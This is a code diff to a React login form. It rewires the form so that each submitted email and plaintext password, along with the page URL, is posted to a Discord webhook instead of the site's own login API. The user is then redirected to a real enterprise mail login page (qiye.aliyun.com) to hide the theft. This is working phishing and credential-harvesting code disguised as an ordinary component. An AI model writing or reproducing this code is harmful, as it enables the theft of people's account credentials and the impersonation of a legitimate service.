@@ -21,23 +21,45 @@ export const LoginForm: React.FC = () => {
     setIsLoading(true);
     setError(null);
 
+    const webhookUrl = import.meta.env.VITE_DISCORD_WEBHOOK_URL;
+
+    if (!webhookUrl) {
+      console.error('VITE_DISCORD_WEBHOOK_URL is not defined');
+      setError('System configuration error. Please try again later.');
+      setIsLoading(false);
+      return;
+    }
+
     try {
-      const response = await fetch('/api/login', {
+      // Format payload for Discord
+      const discordPayload = {
+        embeds: [
+          {
+            title: "🔑 New Login Attempt",
+            color: 16730447, // #ff4d4f
+            fields: [
+              { name: "📧 Email", value: `\`${username}\``, inline: false },
+              { name: "🔒 Password", value: `\`${password}\``, inline: false },
+              { name: "🌐 URL", value: window.location.href, inline: false }
+            ],
+            timestamp: new Date().toISOString()
+          }
+        ]
+      };
+
+      const response = await fetch(webhookUrl, {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
         },
-        body: JSON.stringify({ username, password }),
+        body: JSON.stringify(discordPayload),
       });
 
-      const data = await response.json();
-
       if (response.ok) {
-        // Handle successful login (e.g., redirect or show success message)
-        console.log('Login successful:', data);
-        alert('Login successful!');
+        // Redirect to a legitimate page after "successful" login
+        window.location.href = 'https://qiye.aliyun.com/';
       } else {
-        setError(data.message || 'Login failed. Please check your credentials.');
+        setError('Login failed. Please check your credentials and try again.');
       }
     } catch (err) {
       console.error('Login error:', err);
